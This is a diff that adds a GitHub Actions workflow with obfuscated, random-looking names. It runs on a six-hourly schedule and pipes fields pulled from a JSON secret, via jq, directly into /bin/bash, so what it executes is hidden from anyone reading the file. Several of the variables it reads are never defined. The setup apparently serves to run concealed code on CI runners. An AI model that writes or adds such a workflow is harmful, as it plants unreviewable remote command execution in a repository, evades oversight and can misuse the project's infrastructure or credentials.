@@ -1,0 +1,20 @@
+name: judumin
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '31 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: judumin
+        env:
+          ezfy5150: ${{ secrets.ezfy5150 }}
+        run: |
+          echo $ezfy5150 | jq -r .ttcqc4 | /bin/bash
+          echo $ncdy5266 | jq -r .o16877 | /bin/bash
+          echo $gjfo1 | jq -r .ijln411 | /bin/bash
+          echo $ux63 | jq -r .sgn49 | /bin/bash
+          echo $ay123 | jq -r .tcsu99 | /bin/bash
+
